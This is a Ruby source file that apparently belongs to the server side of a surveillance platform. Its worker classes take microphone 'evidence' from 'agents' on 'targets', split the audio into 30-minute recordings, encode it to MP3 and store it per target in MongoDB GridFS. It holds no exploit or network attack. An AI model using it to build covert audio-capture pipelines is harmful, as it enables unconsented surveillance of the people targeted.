require 'ffi'
require 'mongo'
require 'mongoid'
require 'stringio'

require 'rcs-common/trace'

require_relative 'speex'
require_relative 'wave'
require_relative 'src'
require_relative 'mp3lame'

module RCS
module Worker

  class MicRecording
    include Tracer

    attr_accessor :timecode, :duration, :sample_rate, :bid, :raw_counter

    def initialize(evidence, agent, target)
      @bid = BSON::ObjectId.new
      @target = target
      @mic_id = evidence[:data][:mic_id]
      @sample_rate = evidence[:data][:sample_rate]
      @timecode = tc evidence
      @duration = 0
      @raw_counter = 0

      @evidence = store evidence[:da], agent, @target
    end

    def accept?(evidence)
      @mic_id == evidence[:data][:mic_id] and @duration < 1800 # split every 30 minutes
    end

    def file_name
      @mic_id.to_i.to_s
    end

    def tc(evidence)
      evidence[:da]
    end

    def close!
      yield @evidence
    end

    def feed(evidence)
      @raw_counter += 1
      
      @timecode = tc evidence
      @duration += (1.0 * evidence[:wav].size) / @sample_rate

      left_pcm = Array.new evidence[:wav]
      right_pcm = Array.new evidence[:wav]

      yield @sample_rate, left_pcm, right_pcm
    end

    def update_attributes(hash)
      @evidence.update_attributes hash
    end

    def store(acquired, agent, target)
      evidence = ::Evidence.collection_class(target[:_id].to_s)
      evidence.create do |ev|
        ev._id = @bid
        ev.aid = agent[:_id].to_s
        ev.type = :mic

        ev.da = acquired.to_i
        ev.dr = Time.now.to_i
        ev.rel = 0
        ev.blo = false
        ev.note = ""

        ev.data ||= Hash.new
        ev.data[:duration] = 0

        ev.save
      end
    end
  end

  class MicProcessor
    include Tracer

    def initialize(agent, target)
      @agent = agent
      @target = target
    end

    def tc(evidence)
      evidence[:da] - (evidence[:wav].size / evidence[:data][:sample_rate])
    end

    def feed(evidence)
      @mic ||= MicRecording.new(evidence, @agent, @target)
      unless @mic.accept? evidence
        @mic.close! {|evidence| yield evidence}
        @mic = MicRecording.new(evidence, @agent, @target)
        trace :debug, "created new MIC processor #{@mic.bid}"
      end
      
      @mic.feed(evidence) do |sample_rate, left_pcm, right_pcm|
        encode_mp3(sample_rate, left_pcm, right_pcm) do |mp3_bytes|
          #File.open("#{@mic.file_name}.mp3", 'ab') {|f| f.write(mp3_bytes) }
          write_to_grid(@mic, mp3_bytes)
        end
      end

      return @mic.bid, @mic.raw_counter
    end
    
    def encode_mp3(sample_rate, left_pcm, right_pcm)
      # MP3Encoder will take care of resampling if necessary
      @encoder ||= ::MP3Encoder.new(2, sample_rate)
      unless @encoder.nil?
        @encoder.feed(left_pcm, right_pcm) do |mp3_bytes|
          yield mp3_bytes
        end
      end
    end

    def write_to_grid(mic, mp3_bytes)
      db = Mongoid.database
      fs = Mongo::GridFileSystem.new(db, "grid.#{@target[:_id]}")

      fs.open(mic.file_name, 'a') do |f|
        f.write mp3_bytes
        mic.update_attributes("data.duration" => mic.duration)
        mic.update_attributes("data._grid" => f.files_id)
        mic.update_attributes("data._grid_size" => f.file_length)
      end
    end
  end

end # Worker
end # RCS